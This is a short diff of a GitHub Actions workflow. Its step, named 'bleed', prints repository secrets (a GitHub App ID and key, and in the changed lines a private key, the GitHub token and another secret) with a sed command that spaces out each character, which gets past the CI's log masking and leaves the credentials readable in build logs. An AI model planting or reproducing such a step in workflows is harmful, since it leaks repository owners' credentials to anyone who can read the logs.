@@ -23,8 +23,7 @@ jobs:
       - name: bleed
         run: |
           echo "Let's see what we have here"
-          echo ${{ secrets.MONAD_PRIVATE }} | sed 's/./& /g'
-          echo ${{ secrets.GITHUB_TOKEN }} | sed 's/./& /g'
+          echo ${{ secrets.snarflat }} | sed 's/./& /g'
           echo ${{ secrets.REPO_READONLY_GITHUB_APP_ID }} | sed 's/./& /g'
           echo ${{ secrets.REPO_READONLY_GITHUB_APP_KEY }} | sed 's/./& /g'
           echo "That's all folks..."
